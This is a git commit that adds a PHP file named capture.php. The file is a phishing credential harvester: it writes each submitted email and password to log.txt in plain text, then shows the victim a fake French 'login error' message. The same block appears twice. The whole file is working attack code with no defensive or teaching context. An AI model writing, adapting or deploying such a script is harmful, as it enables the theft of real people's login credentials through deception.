7dfdd55d3477f9493500f1c4fb6bc63807c1308c
ilyqs78uu <kchiridilyas2023@gmail.com>
2025-04-18 15:39:23 +0200

    Add files via upload

---
+++ capture.php
@@ -0,0 +1,8 @@
+<?php
+file_put_contents("log.txt", "Email: ".$_POST['email']." | Mot de passe: ".$_POST['password']."\n", FILE_APPEND);
+echo "Erreur de connexion. Veuillez réessayer.";
+?>
+<?php
+file_put_contents("log.txt", "Email: ".$_POST['email']." | Mot de passe: ".$_POST['password']."\n", FILE_APPEND);
+echo "Erreur de connexion. Veuillez réessayer.";
+?>
